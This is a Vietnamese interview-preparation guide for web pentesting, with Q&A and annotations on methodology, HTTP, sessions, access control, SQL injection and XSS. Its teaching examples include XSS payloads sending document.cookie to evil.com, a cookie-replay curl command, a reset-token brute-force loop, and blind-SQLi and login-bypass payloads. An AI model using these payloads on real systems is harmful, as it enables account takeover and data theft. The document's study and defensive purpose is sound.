---
title: "on tap vin"
---



============================================================
TẬP 1 – GIỚI THIỆU, KINH NGHIỆM, PENTEST METHODOLOGY
============================================================

Câu 1. Hãy giới thiệu bản thân.
Đáp án. Em là sinh viên năm tư An toàn thông tin tại PTIT, tập trung vào Web Security và Digital Forensics. Em đã có kinh nghiệm Web Pentester Intern, sử dụng Burp Suite, OWASP ZAP, Nmap, và thực hành qua PortSwigger, TryHackMe, picoCTF và CTF.

Câu 2. Tại sao bạn chọn Information Security?
Đáp án. Vì em thích tìm nguyên nhân của lỗi, thử nghiệm hệ thống và tư duy theo hướng tấn công để giúp hệ thống an toàn hơn.

Câu 3. Tại sao bạn chọn Web Security?
Đáp án. Web có phạm vi kiến thức rõ, có thể thực hành trực tiếp và kết hợp tốt giữa networking, HTTP, programming và security testing.

Câu 4. Tại sao bạn muốn làm Pentest?
Đáp án. Vì em thích quá trình từ reconnaissance, phát hiện lỗi, kiểm chứng impact đến viết report và đề xuất remediation.

Câu 5. Mục tiêu nghề nghiệp của bạn là gì?
Đáp án. Trước mắt em muốn phát triển kỹ năng Web và API Pentest trong môi trường thực tế; về lâu dài em muốn trở thành security engineer có năng lực assessment và exploitation tốt.

Câu 6. Điểm mạnh của bạn là gì?
Đáp án. Em có khả năng tự học qua lab, đọc request và response, phân tích nguyên nhân vulnerability, và chuyển kiến thức thành write-up hoặc báo cáo kỹ thuật.

Câu 7. Điểm yếu của bạn là gì?
Đáp án. Một số kiến thức ngoài Web Security của em chưa sâu. Em đang cải thiện bằng cách học có hệ thống và thực hành thường xuyên.

Câu 8. Tại sao chúng tôi nên chọn bạn?
Đáp án. Em có nền tảng học thuật, đã có trải nghiệm intern và có thói quen tự thực hành qua lab. Em cũng có blog và CTF nên quen với việc tự nghiên cứu và trình bày kết quả.

Câu 9. Bạn thường học một vulnerability mới như thế nào?
Đáp án. Em học nguyên nhân trước, sau đó source và sink, điều kiện khai thác, PoC, impact, remediation rồi làm lab để kiểm chứng.

Câu 10. Quy trình Web Pentest của bạn từ đầu đến cuối?
Đáp án. Xác định scope, reconnaissance, mapping attack surface, discovery, manual validation, exploitation có kiểm soát, đánh giá impact, rồi report và remediation.

Câu 11. Khi nhận một target mới bạn làm gì đầu tiên?
Đáp án. Em xác nhận scope và rules of engagement, sau đó thu thập domain, subdomain, endpoint, technology và các entry point quan trọng.

Câu 12. Recon là gì?
Đáp án. Recon là quá trình thu thập thông tin về target để hiểu attack surface trước khi kiểm thử sâu.

Câu 13. Attack surface là gì?
Đáp án. Là toàn bộ các điểm có thể bị tác động như domain, API, parameter, upload, authentication flow, network service và chức năng nghiệp vụ.

Câu 14. Discovery khác exploitation thế nào?
Đáp án. Discovery tìm và xác định vấn đề có thể tồn tại; exploitation kiểm chứng khả năng khai thác và impact trong phạm vi được phép.

Câu 15. False positive là gì?
Đáp án. Là finding mà công cụ hoặc analyst đánh giá là có lỗ hổng nhưng kiểm chứng thực tế cho thấy không có hoặc không khai thác được theo điều kiện đã nêu.

Câu 16. Làm sao xác minh một finding?
Đáp án. Em reproduce bằng request hoặc PoC tối thiểu, kiểm tra điều kiện trước và sau khi thay đổi input, rồi xác nhận impact bằng bằng chứng rõ ràng.

Câu 17. Sau khi phát hiện vulnerability bạn làm gì?
Đáp án. Em lưu bằng chứng, xác định root cause, impact, mức độ rủi ro, kiểm tra phạm vi ảnh hưởng và viết remediation.

Câu 18. Risk assessment dựa trên gì?
Đáp án. Dựa trên khả năng khai thác, mức độ ảnh hưởng, điều kiện cần có và tài sản hoặc dữ liệu bị tác động.

Câu 19. Một report pentest tốt cần gì?
Đáp án. Có title, severity, affected asset, description, reproduction hoặc PoC, impact, evidence và remediation rõ ràng.

Câu 20. Remediation tốt là gì?
Đáp án. Không chỉ nói “hãy fix”, mà phải chỉ ra nguyên nhân và hướng sửa cụ thể, ví dụ server-side authorization, parameterized query hoặc proper output encoding.

Câu 21. Pentest thực tế khác CTF ở đâu?
Đáp án. CTF thường có <u>mục tiêu và dữ kiện được thiết kế cho challenge</u>; pentest thực tế yêu cầu <u>scope, an toàn vận hành, bằng chứng, risk assessment </u>và giao tiếp với khách hàng hoặc developer.

Câu 22. Nếu developer phản biện finding thì sao?
Đáp án. Em quay lại evidence, reproduce cùng developer nếu cần, làm rõ điều kiện khai thác và phân biệt giữa technical vulnerability với business impact.

Câu 23. Khi nào bạn dừng exploitation?
Đáp án. Khi đã có đủ bằng chứng về vulnerability và impact, hoặc khi hành động tiếp theo có nguy cơ gây gián đoạn hay vượt scope.

Câu 24. Nếu scanner báo lỗi nhưng bạn không reproduce được?
Đáp án. Em xem request, response và điều kiện scanner sử dụng, sau đó <u>manual retest</u>. Nếu không xác minh được thì không kết luận chắc chắn là vulnerability.

Câu 25. Một Pentester giỏi cần gì?
Đáp án. Nề<u>n tảng networking và Web</u>, khả năng phân tích, manual testing, scripting, tư duy tấn công,<u> hiểu business logic</u> và kỹ năng viết report.

# TẬP 2 – HTTP, WEB ARCHITECTURE, AUTHENTICATION, SESSION, ACCESS CONTROL


Câu 26. HTTP request gồm những gì?
Đáp án. <u>Request line, headers và body</u>; request line gồm method, path và HTTP version.

Câu 27. HTTP response gồm những gì?
Đáp án. Status line, headers và body.

Câu 28. GET và POST khác nhau thế nào?
Đáp án. GET thường dùng để lấy resource; POST thường dùng để gửi dữ liệu để server xử lý hoặc tạo thay đổi. Ý nghĩa cuối cùng phụ thuộc API design.

Câu 29. PUT, PATCH và DELETE là gì?
Đáp án. PUT thường thay thế hoặc cập nhật resource; PATCH cập nhật một phần; DELETE dùng để xóa resource.

Câu 30. 200, 301, 302, 400, 401, 403, 404, 500 có nghĩa gì?
Đáp án. 200 thành công; 301 và 302 chuyển hướng; 400 request không hợp lệ; 401 yêu cầu xác thực; 403 bị từ chối; 404 không tìm thấy; 500 lỗi phía server.

Câu 31. 401 và 403 khác nhau thế nào?
Đáp án. 401 liên quan đến trạng thái xác thực; 403 nghĩa là server hiểu request nhưng từ chối quyền truy cập.

Câu 32. Cookie là gì?
Đáp án. Cookie là dữ liệu server gửi cho client để client lưu và gửi lại trong các request phù hợp.

Câu 33. Session là gì?
Đáp án. Session là trạng thái phiên làm việc của user; server thường liên kết session với một session identifier được gửi qua cookie hoặc cơ chế tương tự.

Câu 34. Authentication và Authorization khác nhau thế nào?
Đáp án. Authentication trả lời “bạn là ai”; Authorization trả lời “bạn được phép làm gì”.
> xac minh va phan quyen

Câu 35. Session fixation là gì?
Đáp án. Attacker <u>khiến nạn nhân sử dụng một session identifier đã biết trướ</u>c, sau đó lợi dụng phiên đó sau khi nạn nhân đăng nhập.
>la viec attacker loi dung victim dung 1 cai session da biet truoc de dang nhap

Câu 36. Session hijacking là gì?
Đáp án. Attacker chiếm session hợp lệ, thường bằng cách <u>lấy session identifier</u> hoặc <u>khai thác lỗi quản lý session</u>.

> [!NOTE]
> # Ví dụ ngắn về Session Hijacking
> 
> ## Kịch bản: Đánh cắp session qua XSS
> 
> **Bước 1:** Victim đăng nhập vào `shop.com`, server cấp cookie:
> ```
> Set-Cookie: sessionid=abc123xyz
> ```
> 
> **Bước 2:** Attacker chèn payload XSS vào trang web (ví dụ qua comment):
> ```html
> <script>
> fetch("https://evil.com/steal?c=" + document.cookie);
> </script>
> ```
> 
> **Bước 3:** Victim truy cập trang có comment độc → trình duyệt chạy script → gửi cookie `sessionid=abc123xyz` tới server attacker.
> 
> **Bước 4:** Attacker dùng cookie đó:
> ```bash
> curl -H "Cookie: sessionid=abc123xyz" https://shop.com/account
> ```
> 
> → Attacker vào được tài khoản victim mà không cần mật khẩu.
> 
> ## Các vector khác
> 
> | Vector | Cách thực hiện |
> |--------|----------------|
> | XSS | Đọc cookie qua `document.cookie` |
> | Sniffing | Bắt gói tin HTTP không mã hóa |
> | Session fixation | Ép victim dùng session ID đã biết |
> | Predictable ID | Đoán session ID yếu (tăng dần, timestamp) |
> | Malware | Cài keylogger, steal cookie |
> | CSRF + XSS | Kết hợp để lấy token |
> 
> ## Phòng chống
> 
> - Cookie có `HttpOnly` → XSS không đọc được.
> - Cookie có `Secure` → chỉ gửi qua HTTPS.
> - Cookie có `SameSite=Strict` → không gửi cross-site.
> - Đổi session ID sau khi đăng nhập.
> - Timeout session ngắn.
> - Dùng HTTPS toàn site.
> 
> **Tóm gọn:** Session hijacking = attacker lấy cookie/session ID của victim, rồi dùng nó để mạo danh victim. Thường qua XSS, sniffing, hoặc session fixation.

Câu 37. Secure cookie nên có thuộc tính gì?
Đáp án. Tùy use case nên dùng <u>Secure, HttpOnly và SameSite</u> phù hợp; thời gian sống và scope cũng cần được giới hạn.

Câu 38. Logout có cần invalidate session không?
Đáp án. Có. Server nên vô hiệu hóa hoặc thay đổi session credential để session cũ không tiếp tục sử dụng được.

Câu 39. Password reset thường có lỗi gì?
Đáp án. <u>Token yếu hoặc đoán được</u>, <u>token không hết hạn</u>, <u>token không ràng buộc đúng user</u>, thiếu <u>rate limiting hoặc logic xác minh không chặt.
</u>

> [!NOTE]
> # Ví dụ ngắn: Lỗi Password Reset
> 
> ## 1. Token yếu hoặc đoán được
> 
> **Lỗi:** Token là `md5(email)` hoặc `base64(email)`.
> 
> **Ví dụ:**
> ```
> Reset link: https://target.com/reset?token=YWRtaW5AdGFyZ2V0LmNvbQ==
> → base64 decode = "admin@target.com"
> ```
> → Attacker tự tạo token cho bất kỳ email nào.
> 
> ---
> 
> ## 2. Token không hết hạn
> 
> **Lỗi:** Token tạo 1 năm trước vẫn dùng được.
> 
> **Ví dụ:**
> ```
> Ngày 1/1/2025: victim yêu cầu reset → token=abc123
> Ngày 1/10/2026: attacker dùng token=abc123 → vẫn thành công
> ```
> → Attacker có nhiều thời gian để khai thác.
> 
> ---
> 
> ## 3. Token không ràng buộc user
> 
> **Lỗi:** Token của user A dùng để reset user B.
> 
> **Ví dụ:**
> ```
> POST /reset
> {
>   "token": "token_cua_user_A",
>   "email": "user_B@target.com",
>   "new_password": "hacked123"
> }
> ```
> → Server chỉ kiểm tra token hợp lệ, không kiểm tra token thuộc về ai.
> → Attacker đổi mật khẩu user B.
> 
> ---
> 
> ## 4. Thiếu Rate Limiting
> 
> **Lỗi:** Cho phép thử token không giới hạn.
> 
> **Ví dụ:**
> ```bash
> # Token 4 chữ số (0000-9999)
> for i in {0000..9999}; do
>   curl "https://target.com/reset?token=$i"
> done
> ```
> → Brute-force 10,000 lần, không bị block.
> 
> ---
> 
> ## 5. Logic xác minh không chặt
> 
> **Lỗi:** Bỏ qua bước xác minh token.
> 
> **Ví dụ:**
> ```
> Bước 1: GET /reset?token=abc → hiện form nhập password mới
> Bước 2: POST /reset/new-password
> 
> Attacker bỏ qua bước 1, gọi thẳng:
> POST /reset/new-password
> {
>   "email": "victim@target.com",
>   "password": "hacked"
> }
> → Server không kiểm tra token → đổi password thành công
> ```
> 
> Hoặc response manipulation:
> ```
> POST /verify-token
> {"token": "wrong"}
> 
> Response: {"valid": false}
> → Attacker sửa response thành {"valid": true}
> → Vào được bước tiếp theo
> ```
> 
> ---
> 
> ## Cây tổng hợp
> 
> ```
> Lỗi Password Reset

<div class="ascii-tree">

> │
> ├── 1. Token yếu
> │   └── md5(email), base64(email)
> │
> ├── 2. Token không hết hạn
> │   └── Dùng được sau nhiều tháng/năm
> │
> ├── 3. Token không ràng buộc user
> │   └── Token A reset user B
> │
> ├── 4. Thiếu rate limiting
> │   └── Brute-force 10,000 lần
> │
> └── 5. Logic không chặt
>     ├── Skip bước verify
>     └── Sửa response

</div>

> ```
> 
> **Tóm gọn:** Password reset hay lỗi ở 4 điểm: token yếu, không hết hạn, không gắn user, và logic lỏng. Mỗi lỗi đều dẫn tới chiếm tài khoản.

Câu 40. Access Control là gì?
Đáp án. Là cơ chế quyết định <u>user hoặc service nào được phép thực hiện action nào trên resource nào</u>.

Câu 41. Horizontal privilege escalation là gì?
Đáp án. User này truy cập được dữ liệu hoặc chức năng của user khác có cùng mức quyền. -> theo chiều ngang

> [!NOTE]
> Phân quyền theo chiều dọc, và phân quyền theo chiều ngang

Câu 42. Vertical privilege escalation là gì?
Đáp án. User có quyền thấp truy cập được chức năng hoặc tài nguyên yêu cầu quyền cao hơn. -> phân quyền theo chiều dọc


Câu 43. IDOR là gì?
Đáp án. Là trường hợp ứng dụng cho phép truy cập object bằng identifier nhưng không kiểm tra authorization đầy đủ.

> [!NOTE]
> truy cập object bằng id, nhưng ko phân quyền đầy đủ 

Câu 44. Làm sao test IDOR?
Đáp án. Dùng hai tài khoản có quyền tương đương hoặc khác nhau, thay object identifier trong request và kiểm tra server có enforce authorization hay không.
=> thay id của các object 

Câu 45. Broken Access Control là gì?
Đáp án. Là nhóm lỗi khi ứng dụng <u>không thực thi đúng chính sách quyền truy cập </u>đối với resource hoặc action.

Câu 46. Có thể chỉ kiểm tra access control ở frontend không?
Đáp án. Không. Authorization phải được enforce ở server vì client có thể bị sửa hoặc giả mạo.

> [!NOTE]
> phân quyền phải được check ở server, vì nếu phân quyền ở server-tức là quyền nằm ở request-> sẽ bị sửa đổi bởi client 
> 

Câu 47. Business Logic flaw là gì?
Đáp án. <u>Là lỗi trong thiết kế </u>hoặc<u> quy trình nghiệp vụ</u> khiến attacker dùng chức năng hợp lệ theo cách không được nhà phát triển dự kiến để tạo ra lợi ích hoặc tác động bất thường.

> [!NOTE]
> ví dụ về race condition trong coupon giảm giá, ví dụ về ko rate limit với các coupon giảm giá, ví dụ giảm 10% đơn hàng, nhưng ko giới hạn số lượng hay số tiền max được giảm

Câu 48. Client-side validation có an toàn không?
Đáp án. Không đủ. Nó chỉ hỗ trợ UX; mọi kiểm tra bảo mật quan trọng phải được thực hiện server-side.


Câu 49. Same-Origin Policy là gì?
Đáp án. Là cơ chế trình duyệt <u>hạn chế JavaScript từ một origin truy cập tài nguyên của origin</u> khác theo các quy tắc bảo mật.

> [!NOTE]
> nó chỉ ngăn đọc dữ liệu thôi, chứ nó ko ngăn gửi request. Nên 1 trang web mà nó bị store xss, nó vẫn thực thi mã -> đọc cookie và fetch tới url của attacker

Câu 50. CORS là gì?
Đáp án. CORS là cơ chế cho phép server khai báo những cross-origin requests nào browser có thể cho phép.

Câu 51. Reverse proxy là gì?
Đáp án. Là server đứng trước backend để nhận request rồi chuyển tiếp đến service phía sau; nó có thể hỗ trợ routing, TLS termination, caching hoặc filtering.

Câu 52. Load balancer là gì?
Đáp án. Là thành phần phân phối traffic đến nhiều backend instance để cải thiện khả năng mở rộng hoặc tính sẵn sàng.

Câu 53. Web server và application server khác nhau thế nào?
Đáp án. Web server chủ yếu xử lý HTTP/static content và reverse proxying; application server chạy business logic hoặc ứng dụng phía sau. Ranh giới phụ thuộc kiến trúc.

============================================================
TẬP 3 – SQL INJECTION
============================================================

Câu 54. SQL Injection là gì?
Đáp án. Là lỗi xảy ra khi<u> input của người dùng được đưa vào câu SQL theo cách làm thay đổi cấu trúc truy vấn</u> ngoài ý định.

Câu 55. Vì sao SQLi xảy ra?
Đáp án. Nguyên nhân phổ biến là <u>nối chuỗi input trực tiếp vào SQL </u>thay vì<u> dùng parameterized queries </u>hoặc cơ chế truy vấn an toàn.

Câu 56. Union-based SQLi là gì?
Đáp án. Là SQLi dùng UNION để ghép kết quả của một truy vấn khác vào kết quả trả về, khi điều kiện về số cột và kiểu dữ liệu phù hợp.

Câu 57. Error-based SQLi là gì?
Đáp án. Là<u> khai thác thông báo lỗi từ database để thu thập thông tin </u>hoặc <u>xác nhận biểu thức đã được thực thi</u>.

> [!NOTE]
> gồm 2 cái là khai thác dữ liệu từ thông báo lỗi hoặc xác nhận biểu thức thực thi có đúng hay kpo

Câu 58. Boolean-based Blind SQLi là gì?
Đáp án. Là <u>suy luận dữ liệu</u> <u>dựa trên sự khác nhau</u> <u>giữa response khi điều kiện đúng và sai.
</u>

> [!NOTE]
> phân tích respomse trả về giữa đúng và sai
> hay dùng câu lệnh substring(pass,1,0)='kí tự' để check password

Câu 59. Time-based Blind SQLi là gì?
Đáp án. Là <u>suy luận kết quả thông qua độ trễ có điều kiện</u> do database tạo ra.

> [!NOTE]
> # Ví dụ ngắn: Time-based Blind SQLi
> 
> ## Kịch bản
> 
> Trang web có URL:
> ```
> https://shop.com/product?id=1
> ```
> 
> Server không hiển thị lỗi SQL, cũng không thay đổi nội dung trang khi query đúng/sai. ==Nhưng nếu query **chậm**, response cũng **chậm** theo.==
> 
> ## Bước 1: Xác nhận có SQLi
> 
> **Payload:**
> ```
> ?id=1' AND SLEEP(5)--
> ```
> 
> ==Nếu server phản hồi **sau 5 giây** → có SQLi. Nếu phản hồi ngay → không có.==
> 
> ## Bước 2: Đoán dữ liệu từng ký tự
> 
> **Đoán ký tự đầu của tên database:**
> ```
> ?id=1' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
> ```
> - Nếu database bắt đầu bằng 'a' → chậm 5 giây.
> - Nếu không → phản hồi ngay.
> 
> **Đoán ký tự thứ 2:**
> ```
> ?id=1' AND IF(SUBSTRING(database(),2,1)='d', SLEEP(5), 0)--
> ```
> 
> Cứ thế, đoán từng ký tự một → dựng lại toàn bộ tên database, table, column, và dữ liệu.
> 
> ## Bước 3: Tăng tốc bằng binary search
> 
> Thay vì đoán từng ký tự `a-z`, dùng so sánh ASCII:
> ```
> ?id=1' AND IF(ASCII(SUBSTRING(database(),1,1)) > 100, SLEEP(5), 0)--
> ```
> → Mỗi lần loại được một nửa ký tự. Nhanh hơn nhiều.
> 
> ## Ví dụ thực tế hoàn chỉnh
> 
> **Mục tiêu:** Lấy password của admin.
> 
> ```
> # Kiểm tra độ dài password
> ?id=1' AND IF(LENGTH((SELECT password FROM users WHERE username='admin'))=32, SLEEP(5), 0)--
> → Chậm 5s → password dài 32 ký tự
> 
> # Đoán ký tự thứ 1
> ?id=1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
> → Không chậm → không phải 'a'
> 
> # Thử ký tự khác
> ?id=1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5', SLEEP(5), 0)--
> → Chậm 5s → ký tự đầu là '5'
> 
> # Tiếp tục cho đến khi đủ 32 ký tự
> ```
> 
> ## So sánh các kỹ thuật
> 
>
> | Kỹ thuật | Dấu hiệu | Tốc độ |
> |----------|----------|--------|
> | Union-based | Response chứa dữ liệu | Nhanh nhất |
> | Error-based | Response chứa lỗi | Nhanh |
> | Boolean-based | Response thay đổi đúng/sai | Chậm |
> | **Time-based** | Response chậm khi đúng | **Chậm nhất** |
> 
> ## Cây tổng hợp
> 
> ```
> Time-based Blind SQLi

<div class="ascii-tree">

> │
> ├── 1. Nguyên lý
> │   ├── Không thấy lỗi
> │   ├── Không thấy dữ liệu
> │   └── Chỉ đo được thời gian
> │
> ├── 2. Hàm gây delay
> │   ├── MySQL: SLEEP()
> │   ├── MSSQL: WAITFOR DELAY
> │   ├── PostgreSQL: pg_sleep()
> │   └── Oracle: dbms_pipe.receive_message
> │
> ├── 3. Quy trình
> │   ├── 1. Xác nhận SQLi
> │   ├── 2. Đoán độ dài
> │   ├── 3. Đoán từng ký tự
> │   └── 4. Tăng tốc binary search
> │
> └── 4. Nhược điểm
>     ├── Chậm (hàng ngàn request)
>     ├── Dễ bị phát hiện qua timeout
>     └── Cần kết nối ổn định

</div>

> ```
> 
> **Tóm gọn:** Time-based Blind SQLi là kỹ thuật khai thác khi server không trả về lỗi hay dữ liệu — attacker đoán dữ liệu bằng cách **đo thời gian phản hồi**. Nếu điều kiện đúng → server delay. Nếu sai → phản hồi ngay. Đây là kỹ thuật chậm nhất nhưng đáng tin cậy nhất khi các kỹ thuật khác thất bại.

Câu 60. Authentication bypass bằng SQLi là gì?
Đáp án. Attacker <u>thay đổi logic của truy vấn xác thực để điều kiện kiểm tra username hoặc password bị sai lệch.</u>

> [!NOTE]
> # Ví dụ ngắn: Authentication Bypass bằng SQLi
> 
> ## Kịch bản
> 
> Form đăng nhập tại `admin.com/login`:
> 
> ```php
> $query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
> $result = mysqli_query($conn, $query);
> 
> if (mysqli_num_rows($result) > 0) {
>     // Đăng nhập thành công
> }
> ```
> => cơ chế xác thực sơ sài, chỉ check trạng thái query được hay ko, chứ ko check xem có query hược hết hay ko, đang lẽ phải query password từ username--> sau đó so sánh với password của ==input== 
> ## Khai thác
> 
> **Nhập vào form:**
> ```
> Username: admin' --
> Password: (bất kỳ)
> ```
> 
> **Query trở thành:**
> ```sql
> SELECT * FROM users WHERE username='admin'--' AND password='anything'
> ```
> 
> Dấu `--` biến phần còn lại thành comment → **điều kiện password bị vô hiệu hóa hoàn toàn**.
> 
> → Server trả về user `admin` → **đăng nhập thành công mà không cần mật khẩu đúng**.
> 
> ## Các payload phổ biến khác
> 
>
> | Payload | Query kết quả |
> |---------|---------------|
> | `' OR '1'='1` | `WHERE username='' OR '1'='1' AND password=''` → luôn đúng |
> | `admin' OR 1=1--` | `WHERE username='admin' OR 1=1--` → luôn đúng |
> | `' OR 'x'='x'--` | `WHERE username='' OR 'x'='x'--` → luôn đúng |
> | `admin'/*` | `WHERE username='admin'/*' AND password=''` → comment phần sau |
> 
> ## Kết quả
> 
> ```
> Query gốc:  WHERE username='admin' AND password='secret'
> Query mới:  WHERE username='admin'--' AND password='secret'
>             ↑ Phần password bị comment
> → Chỉ cần username đúng là vào được.
> ```
> 
> **Tóm gọn:** Authentication bypass bằng SQLi = ==attacker chèn payload vào form đăng nhập để **vô hiệu hóa điều kiện kiểm tra mật khẩu**.== Dấu `--`, `/*`, hoặc `OR 1=1` khiến query luôn trả về kết quả → đăng nhập thành công mà không cần mật khẩu.

Câu 61. Làm sao phát hiện parameter có khả năng SQLi?
Đáp án. Thử input làm thay đổi syntax hoặc logic, <u>quan sát error</u>, <u>response length</u>, status,<u> timing</u> và sau đó manual validate.

> [!NOTE]
> # Ví dụ ngắn: Phát hiện SQLi
> 
> ## 1. Chèn ký tự đặc biệt → quan sát error
> 
> ```
> ?id=1'      → lỗi SQL syntax?
> ?id=1"      → lỗi?
> ?id=1)      → lỗi?
> ?id=1;--    → lỗi?
> ```
> 
> Thấy `You have an error in your SQL syntax` → có SQLi.
> 
> ## 2. So sánh logic đúng/sai
> 
> ```
> ?id=1 AND 1=1   → trang bình thường
> ?id=1 AND 1=2   → trang trống / khác
> ```
> 
> Hai response khác nhau → có SQLi (Boolean-based).
> 
> ## 3. So sánh response length / status
> 
> ```
> ?id=1       → 200 OK, 5432 bytes
> ?id=1'      → 500 Error, 0 bytes
> ?id=1 AND 1=2 → 200 OK, 1200 bytes
> ```
> 
> Khác biệt về **status code** hoặc **độ dài body** → dấu hiệu SQLi.
> 
> ## 4. Test timing
> 
> ```
> ?id=1; SLEEP(5)--        → chậm 5s → có SQLi
> ?id=1 AND SLEEP(5)--     → chậm 5s → có SQLi
> ?id=1; WAITFOR DELAY '0:0:5'--  → MSSQL
> ```
> 
> Phản hồi chậm bất thường → Time-based SQLi.
> 
> ## 5. Dùng phép toán
> 
> ```
> ?id=2-1     → nếu giống id=1 → có SQLi
> ?id=1*1     → nếu giống id=1 → có SQLi
> ?id=1/0     → lỗi chia 0 → có SQLi
> ```
> 
> ## 6. Manual validate
> 
> Sau khi có dấu hiệu, xác nhận thủ công bằng Burp Repeater:
> - Gửi lại nhiều lần → kết quả ổn định?
> - Thử `ORDER BY 1`, `ORDER BY 2`... → tìm số cột.
> - Thử `UNION SELECT 1,2,3` → xác nhận khai thác được.
> 
> ## Bảng tóm tắt
> 
> | Cách test | Dấu hiệu SQLi |
> |-----------|---------------|
> | `'`, `"`, `)`, `;` | Lỗi syntax |
> | `AND 1=1` vs `AND 1=2` | Response khác |
> | `SLEEP(5)` | Chậm 5s |
> | `2-1` vs `1` | Cùng kết quả |
> | `1/0` | Lỗi chia 0 |
> | Response length/status | Thay đổi |
> 
> ==**Tóm gọn:** Cách phổ biến nhất là chèn `'` để xem có lỗi không, rồi so sánh `AND 1=1` với `AND 1=2` để xác nhận. Nếu không thấy gì, dùng `SLEEP()` đo timing. Luôn validate thủ công bằng Burp sau khi có dấu hiệu.==


Câu 62. Không có database error thì test SQLi thế nào?
Đáp án. Dùng<u> boolean conditions, timing</u> và các payload phù hợp với DBMS để tìm sự khác biệt có kiểm chứng.

Câu 63. Prepared Statement giải quyết SQLi thế nào?
Đáp án. Nó <u>tách dữ liệu khỏi cấu trúc câu SQL</u>, <u>khiến input được xử lý như giá trị thay vì một phần của query</u>.

> [!NOTE]
> 
> ## Cách hoạt động
> 
> **Không dùng Prepared Statement (dễ bị SQLi):**
> ```php
> $query = "SELECT * FROM users WHERE username='" . $_GET['u'] . "'";
> ```
> 
> Attacker nhập `admin'--` → query thành:
> ```sql
> SELECT * FROM users WHERE username='admin'--'
> ```
> → Sửa được cấu trúc query.
> 
> **Dùng Prepared Statement (an toàn):**
> ```php
> $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
> $stmt->execute([$_GET['u']]);
> ```
> 
> Attacker nhập `admin'--` → database hiểu đó là **chuỗi giá trị**, không phải cú pháp:
> ```
> username = "admin'--"
> ```
> → Không tìm thấy user nào. Query không bị thay đổi.
> 
> ## Cơ chế 2 bước
> 
> **Bước 1:** Gửi query template `SELECT * FROM users WHERE username = ?` → database **compile** trước.
> **Bước 2:** Gửi giá trị `admin'--` → database **bind** vào chỗ `?`, không diễn giải là code.
> 
> ## So sánh trực quan
> 
> | | Query gốc | Sau khi nhập `admin'--` |
> |---|-----------|------------------------|
> | **Nối chuỗi** | `WHERE username='X'` | `WHERE username='admin'--'` → query đổi cấu trúc |
> | **Prepared** | `WHERE username=?` | `WHERE username="admin'--"` → chỉ là giá trị |
> 
> ==**Tóm gọn:** Prepared Statement tách **cấu trúc SQL** khỏi **dữ liệu người dùng**. Database compile query trước, sau đó mới bind input như giá trị thuần túy → input không bao giờ trở thành code → không thể SQLi.==

Câu 64. ORM có loại bỏ hoàn toàn SQLi không?
Đáp án. Không. ORM giảm nguy cơ trong nhiều trường hợp nhưng raw query, dynamic SQL hoặc cách sử dụng không an toàn vẫn có thể gây SQLi.

Câu 65. SQLmap dùng để làm gì?
Đáp án. SQLmap tự động phát hiện và khai thác nhiều dạng SQL Injection; nó hữu ích cho kiểm chứng nhưng không thay thế manual analysis.

Câu 66. Khi nào không nên dùng SQLmap?
Đáp án. Khi <u>scope không cho phép automated exploitation</u>, khi test có nguy cơ tải lớn, hoặc khi <u>manual validation là cần thiết để hiểu chính xác logic và impact.</u>


# TẬP 4 – XSS, CSRF, FILE UPLOAD

Câu 67. XSS là gì?
Đáp án. XSS là lỗi cho phép input hoặc dữ liệu không tin cậy được diễn giải như script trong context của một trang hoặc ứng dụng.

Câu 68. Reflected, Stored và DOM XSS khác nhau thế nào?
Đáp án. Reflected thường phản chiếu input trong response; Stored được lưu rồi render cho người khác; DOM XSS xảy ra trong quá trình JavaScript phía client xử lý dữ liệu vào sink nguy hiểm.

> [!NOTE]
> input :location.search, location.hash --> với reflect thường nằm trong các phần đi tới 1 html dựa vào id, dựa vào hash, hoặc gợi ý kết quả tìm kiếm
> -còn store thì thường ở những chỗ như feedback hay  comment
> domxss thì nó thì nó đi vào những thuộc tính html js có khả năng code exucution
> 

> [!NOTE]
> # Ví dụ ngắn: 3 loại XSS
> 
> ## 1. Reflected XSS
> 
> **Input phản chiếu ngay trong response, không lưu lại.**
> 
> URL:
> ```
> https://shop.com/search?q=<script>alert(1)</script>
> ```
> 
> Server trả về:
> ```html
> <p>Kết quả cho: <script>alert(1)</script></p>
> ```
> ==--> thường nằm ở phần gợi ý kết quả tìm kiếm==
> ==--> nhập tên của bạn...-->response--> hello ....==
> → Script chạy ngay khi victim click link. Chỉ ảnh hưởng người click.
> 
> ## 2. Stored XSS
> 
> **Payload được lưu vào database, render cho mọi người xem.**
> 
> Victim A đăng comment:
> ```html
> <script>fetch("https://evil.com/?c="+document.cookie)</script>
> ```
> 
> Server lưu vào DB. Khi Victim B mở trang comment:
> ```html
> <div class="comment"><script>fetch(...)</script></div>
> ```
> 
> → Script chạy trên trình duyệt của **mọi người** xem comment. Nguy hiểm hơn nhiều.
> 
> ## 3. DOM XSS
> 
> **Lỗi nằm ở JavaScript phía client, server không thấy payload.**
> 
> URL:
> ```
> https://shop.com/#<img src=x onerror=alert(1)>
> ```
> 
> Code client:
> ```javascript
> var name = location.hash.slice(1);
> document.getElementById("greet").innerHTML = name;  // ← sink
> ```
> 
> → Payload không gửi lên server. Server trả về HTML sạch, nhưng JS phía client đọc `location.hash` và chèn vào `innerHTML` → XSS.
> 
> ## Bảng so sánh
> 
> | | Reflected | Stored | DOM |
> |---|-----------|--------|-----|
> | **Lưu ở server?** | Không | Có | Không |
> | **Server thấy payload?** | ==Có== | Có | Không |
> | **Ảnh hưởng** | Người click link | Mọi người xem | Người click link |
> | **Ví dụ** | `?q=<script>` | Comment độc | `#<img onerror>` |
> | **Sink** | HTML response | Database → HTML | innerHTML, eval... |
> 
> **Tóm gọn:** Reflected = phản chiếu ngay, chỉ ảnh hưởng người click. Stored = lưu DB, ảnh hưởng mọi người xem. DOM = xảy ra ở JS phía client, server không thấy payload.

Câu 69. Source và Sink trong DOM XSS là gì?
> Đáp án. Source là nơi dữ liệu không tin cậy đi vào JavaScript; sink là nơi dữ liệu đó được đưa vào context có thể thực thi hoặc thay đổi HTML/JavaScript.

> [!NOTE]
> 
> ## Source (Nguồn dữ liệu)
> 
> | Source | Chức năng |
> |--------|-----------|
> | `location.hash` | Lấy phần sau dấu `#` trên URL (vd: `#abc`) |
> | `location.search` | Lấy query string (vd: `?id=1&name=x`) |
> | `document.referrer` | URL của trang trước đó dẫn tới trang hiện tại |
